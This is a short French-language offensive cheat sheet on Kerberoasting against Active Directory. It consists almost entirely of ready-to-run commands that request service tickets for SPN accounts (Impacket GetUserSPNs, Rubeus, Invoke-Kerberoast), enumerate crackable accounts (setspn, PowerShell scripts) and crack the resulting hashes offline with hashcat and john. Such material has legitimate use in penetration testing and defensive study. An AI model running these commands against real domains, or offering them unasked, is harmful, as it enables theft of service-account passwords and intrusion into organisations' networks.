## Kerberoasting
Permet à un utilisateur de demander un ticket de service pour n'importe quel service avec un SPN enregistré, puis d'utiliser ce ticket pour déchiffrer le mot de passe du service. **Si le service a un SPN enregistré, il peut être Kerberoastable**

**Impacket**

```sh
impacket-GetUserSPNs.py target.local/user:password -dc-ip 192.168.x.x -request
```

**Rubeus**

```sh
C:\Users\Administrator> Rubeus.exe kerberoast
```

```
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

**Invoke-Kerberoast**

```sh
C:\Users\Administrator> Invoke-Kerberoast -domain target.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
```

---

Acceder au system compromis et chercher les SPN vulnerables

```c
. .\Find-PotentiallyCrackableAccounts.ps1

Find-PotentiallyCrackableAccounts
```

```c
setspn.exe -Q */*
```

Demander un ticket pour le TGS

```c
. .\Get-TGSCipher.ps1
Get-TGSCipher -SPN "SPN" -Format john
```

```c
rubeus.exe kerberoast /outfile:hash.txt
```